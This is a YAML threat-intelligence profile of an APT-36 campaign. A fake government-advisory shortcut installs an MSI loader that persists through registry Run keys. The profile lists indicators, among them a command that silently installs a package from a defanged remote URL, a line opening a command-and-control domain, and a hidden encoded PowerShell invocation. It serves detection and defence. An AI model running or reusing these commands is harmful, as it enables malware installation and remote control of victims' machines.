description: APT-36 uses a malicious shortcut file disguised as a government advisory
  PDF to deliver an MSI payload that installs a .NET-based loader and establishes
  registry-based persistence.
attribution: APT-36
malware_families:
- NCERT-Whatsapp-Advisory
- WinRAR
TTPs:
  processes:
  - cmd.exe
  - msiexec.exe
  - ConsoleApp1.exe
  - PcDirvs.exe
  - mshta.exe
  - powershell.exe
  commandline:
  - C:\\Windows\\System32\\cmd.exe /c msiexec.exe /q /i https[:]//aeroclubofindia[.]co[.]in/css/NCERT-Whatsapp-Advisory/winc
  - cmd.exe /c start https://dns.wmiprovider.com
  - powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ...
  powershell:
  - '...'
  scripting_engine:
  - VBS
  registry_keys:
  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell
    Folders
  image_load:
  - wininet.dll
  network_connections:
  - ConsoleApp1.exe, dns.wmiprovider.com, 80
  - cmd.exe, dns.wmiprovider.com, 80
  - powershell.exe, dns.wmiprovider.com, 443
  file_activity:
  - C:\\Users\\Public\\NCERT-Whatsapp-Advisory.pdf
  - C:\\ProgramData\\PcDirvs\\pdf.dll
  - C:\\ProgramData\\PcDirvs\\wininet.dll
  - C:\\ProgramData\\PcDirvs\\PcDirvs.exe
  - C:\\ProgramData\\PcDirvs\\PcDirvs.hta
  - C:\\ProgramData\\PcDirvs.exe
  - C:\\ProgramData\\PcDirvs.hta
  - C:\\ProgramData\\pdt.an
  - C:\\ProgramData\\wininet.dll
  persistence:
  - Creating an HTA file that uses embedded VBScript to register a malicious executable
    in the Windows startup registry key
  process_relations:
  - cmd.exe->msiexec.exe->ConsoleApp1.exe->PcDirvs.exe
